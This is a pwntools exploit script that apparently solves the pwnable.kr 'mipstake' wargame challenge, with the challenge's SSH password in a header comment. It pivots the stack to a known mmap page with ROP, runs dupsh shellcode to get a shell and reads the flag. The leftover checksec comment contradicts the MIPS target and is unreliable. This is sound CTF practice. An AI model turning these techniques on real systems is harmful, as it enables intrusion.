#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 2222 --pass H4d_som3_fun_w1th_ech0_ov3rfl0w --user mipstake ./mipstake
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("./mipstake")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "pwnable.kr"
port = int(args.PORT or 2222)
user = args.USER or "mipstake"
password = args.PASSWORD or "guest"
remote_path = "mipstake"

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    # to debug, run ./gdbserver-7.12-mips-be localhost:1234 mipstake inside vm and attach with gdb
    return connect("127.0.0.1", 9033)

def start_remote(argv=[], *a, **kw):
    """Execute the target binary on the remote host"""
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.connect_remote("127.0.0.1", 9033)


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

context.terminal = ["kitty"]

def send_rop(io: tube, rop: bytes):
    assert b"\n" not in rop
    io.sendline(rop)

io = start()

mmap_addr = 0x66666000

# pivot stack to mmaped page
info("pivoting stack")

first_rop = b"A" * 0x10
first_rop += p32(mmap_addr)  # mmap address - fp
first_rop += p32(0x40095c)  # just before handle_client_internal
send_rop(io, first_rop)

# now fp is at our page, which make the binary "think" sp should be restored to it before returning to us so we pivoted the stack
# the first argument passed to handle_client_internal is $fp+0x18 (buffer) so we can now control the contents of the mmaped page
# since we still control the stack (as it is pivoted to the page), we can continue the rop. as NX is disabled and the page's address
# is known, we write our shellcode and jump to it.
info("popping shell")
second_rop = b"A" * 0x10
second_rop += p32(0)  # saved fp - arbitrary
second_rop += p32(mmap_addr + 0x30)  # address of shellcode
second_rop += asm(shellcraft.dupsh('$a0'))
send_rop(io, second_rop)

io.sendline(b"cat flag")
success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")